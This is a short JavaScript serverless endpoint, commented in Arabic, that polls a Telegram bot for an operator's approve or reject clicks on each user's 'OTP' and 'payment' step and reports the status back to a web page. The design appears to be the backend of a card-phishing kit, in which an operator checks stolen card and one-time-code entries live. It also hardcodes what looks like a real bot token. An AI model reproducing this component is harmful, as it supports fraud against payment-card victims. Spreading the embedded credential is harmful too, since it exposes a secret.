export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { user_id } = req.query;
  if (!user_id) return res.status(400).json({ status: 'pending' });

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";

  try {
    // جلب آخر التحديثات مباشرة من تليجرام لنرى إذا تم الضغط على زر هذا المستخدم
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-30&allowed_updates=["callback_query"]`);
    const tgData = await tgRes.json();

    let status = 'pending';

    if (tgData.ok && tgData.result) {
      for (const update of tgData.result) {
        if (update.callback_query) {
          const data = update.callback_query.data;
          if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
            status = 'approved';
            break;
          } else if (data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) {
            status = 'rejected';
            break;
          }
        }
      }
    }

    return res.status(200).json({ status });
  } catch (err) {
    return res.status(200).json({ status: 'pending' });
  }
}
